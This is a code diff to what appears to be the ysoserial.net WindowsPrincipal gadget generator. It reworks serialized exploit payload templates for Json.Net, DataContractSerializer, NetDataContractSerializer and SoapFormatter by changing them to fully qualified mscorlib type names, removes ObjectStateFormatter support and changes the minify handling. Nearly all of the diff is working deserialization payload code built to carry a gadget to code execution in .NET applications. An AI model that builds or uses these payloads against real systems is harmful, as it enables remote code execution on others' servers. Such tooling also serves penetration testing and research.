@@ -35,7 +35,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter", "ObjectStateFormatter" };
+            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
         }
 
         public override string Name()
@@ -71,8 +71,7 @@ namespace ysoserial.Generators
             string b64encoded = Convert.ToBase64String(gadget);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
+                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
             {
                 WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();
                 obj.wi = id;
@@ -81,9 +80,9 @@ namespace ysoserial.Generators
             else if (formatter.ToLower().Equals("json.net"))
             {
                 string payload = @"{
-                    '$type': 'System.Security.Principal.WindowsPrincipal',
+                    '$type': 'System.Security.Principal.WindowsPrincipal, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                     'Identity':{
-                        '$type':'System.Security.Principal.WindowsIdentity',
+                        '$type':'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                         'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                     }
                 }";
@@ -115,19 +114,27 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("datacontractserializer"))
             {
-                string payload = $@"<root type=""System.Security.Principal.WindowsPrincipal"">
+                string payload = $@"<root type=""System.Security.Principal.WindowsPrincipal, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
     <WindowsPrincipal xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" >
         <m_identity>
-            <System.Security.ClaimsIdentity.actor i:type=""a:string"" xmlns="""" xmlns:a=""http://www.w3.org/2001/XMLSchema"" >
+            <System.Security.ClaimsIdentity.actor i:type=""x:string"" xmlns="""" xmlns:x=""http://www.w3.org/2001/XMLSchema"" >
                 {b64encoded}
             </System.Security.ClaimsIdentity.actor>
         </m_identity>
     </WindowsPrincipal>
 </root>";
 
-                // just remove spaces, not xmlns attribute values, also no xxe here kids
-                if (inputArgs.Minify) {
-                    payload = XElement.Parse(payload).ToString(SaveOptions.DisableFormatting);
+                // this will break the payload, because x is used! todo for @irsdl: fix the xslt in XMLMinifier.cs to have the option to include "unused variables"
+                if (inputArgs.Minify)
+                {
+                    if (inputArgs.UseSimpleType)
+                    {
+                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                    }
+                    else
+                    {
+                        payload = XMLMinifier.Minify(payload, null, null);
+                    }
                 }
 
                 if (inputArgs.Test)
@@ -148,14 +155,14 @@ namespace ysoserial.Generators
             {
 
                 string payload = $@"
-<WindowsPrincipal z:Type=""System.Security.Principal.WindowsPrincipal"" z:Assembly=""0"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" >
-    <m_identity z:Type=""System.Security.Principal.WindowsIdentity"" z:Assembly=""0"" >
+<WindowsPrincipal z:Type=""System.Security.Principal.WindowsPrincipal"" z:Assembly=""mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" >
+    <m_identity z:Type=""System.Security.Principal.WindowsIdentity"" z:Assembly=""mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" >
         <System.Security.ClaimsIdentity.actor z:Type=""System.String"" z:Assembly=""0"" xmlns="""">
             {b64encoded}
         </System.Security.ClaimsIdentity.actor>
     </m_identity>
-</WindowsPrincipal>
-";
+</WindowsPrincipal>";
+
                 if (inputArgs.Minify)
                 {
                     if (inputArgs.UseSimpleType)
@@ -217,6 +224,7 @@ namespace ysoserial.Generators
         </a1:WindowsIdentity>
     </SOAP-ENV:Body>
 </SOAP-ENV:Envelope>";
+
                 if (inputArgs.Minify)
                 {
                     if (inputArgs.UseSimpleType)
